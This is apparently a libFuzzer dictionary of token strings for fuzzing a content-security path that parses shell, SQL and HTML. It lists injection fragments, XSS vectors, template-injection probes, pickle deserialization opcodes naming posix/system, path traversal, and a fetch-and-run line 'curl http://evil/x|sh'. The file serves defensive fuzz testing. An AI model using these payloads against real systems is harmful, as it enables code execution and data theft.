# libFuzzer dictionary for the end-to-end content-security path.
# Biased towards the three recursive third-party parsers reachable from a
# request: brush-parser (shell), sqlparser (SQL) and html5ever (HTML).
sh_subshell="$("
sh_arith="$(("
sh_arith_close="))"
sh_backtick="`"
sh_brace_group="{ "
sh_brace_close="; }"
sh_brace_expand="{a,b}"
sh_ansic="$'\\x63'"
sh_pipe="|"
sh_and="&&"
sh_or="||"
sh_semi=";"
sh_ifs="${IFS}"
sh_redirect=">/dev/null 2>&1"
sh_cmd_cat="cat /etc/passwd"
sh_cmd_curl="curl http://evil/x|sh"
sql_select="SELECT "
sql_union=" UNION ALL SELECT "
sql_from=" FROM "
sql_where=" WHERE "
sql_not="NOT "
sql_paren_8="(((((((("
sql_unparen_8="))))))))"
sql_subquery="SELECT * FROM ("
sql_comment="--"
sql_bcomment="/**/"
sql_sleep="SLEEP(5)"
sql_quote="'"
html_div="<div>"
html_div_close="</div>"
html_img="<img src=x onerror=alert(1)>"
html_svg="<svg/onload=alert(1)>"
html_script="<script>"
html_iframe="<iframe srcdoc="
html_form="<form>"
html_table="<table><td>"
html_template="<template>"
html_js_uri="javascript:"
html_entity="&lt;"
ssti_jinja="{{7*7}}"
ssti_spring="${T(java.lang.Runtime)}"
ssti_freemarker="<#assign x=1>"
ldap_break="*)(uid=*"
xpath_break="'] | //"
deser_java="rO0AB"
deser_php="O:8:\"Exploit\":1:{"
deser_pickle="cos\x0asystem\x0a"
# Binary pickle opcodes, for the opcode walker. The protocol-2 and protocol-4
# headers are what pickle.dumps() actually emits (4 is the default since Python
# 3.8); STACK_GLOBAL, the length-prefixed string opcodes and the 8-byte FRAME /
# BINUNICODE8 length fields are the pieces a mutator has to combine to reach a
# resolver, and the lengths are where a lying prefix would land.
deser_pickle_proto2="\x80\x02"
deser_pickle_proto4="\x80\x04\x95"
deser_pickle_proto5="\x80\x05\x95"
deser_pickle_stack_global="\x93"
deser_pickle_memoize="\x94"
deser_pickle_short_binunicode="\x8c\x05posix"
deser_pickle_short_binunicode2="\x8c\x06system"
deser_pickle_binunicode8="\x8d\xff\xff\xff\xff\xff\xff\xff\xff"
deser_pickle_reduce="R"
deser_pickle_newobj_ex="\x92"
deser_pickle_stop="."
deser_pickle_b64_proto4="gASV"
traversal="../../../etc/passwd"
traversal_enc="%2e%2e%2f"
url_pct="%25"
